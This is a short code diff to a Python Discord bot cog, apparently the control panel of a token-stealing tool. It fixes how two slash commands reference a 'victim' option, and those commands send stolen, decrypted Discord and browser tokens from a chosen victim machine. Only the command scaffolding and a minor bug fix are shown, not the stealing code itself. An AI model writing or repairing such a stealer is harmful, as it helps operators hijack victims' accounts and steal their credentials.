@@ -15,7 +15,7 @@ class CheckedTokens(commands.Cog):
         
     @commands.slash_command(
         description="Sends checked tokens along with info (web browsers)",
-        options=[self.bot.victim],
+        options=[bot.victim],
     )
     async def checked_tokens(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
@@ -52,7 +52,7 @@ class CheckedTokens(commands.Cog):
 
     @commands.slash_command(
         description="[EXPERIMENTAL] Decrypts and checks encrypted Discord Tokens",
-        options=[self.bot.victim]
+        options=[bot.victim]
     )
     async def checked_discord(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
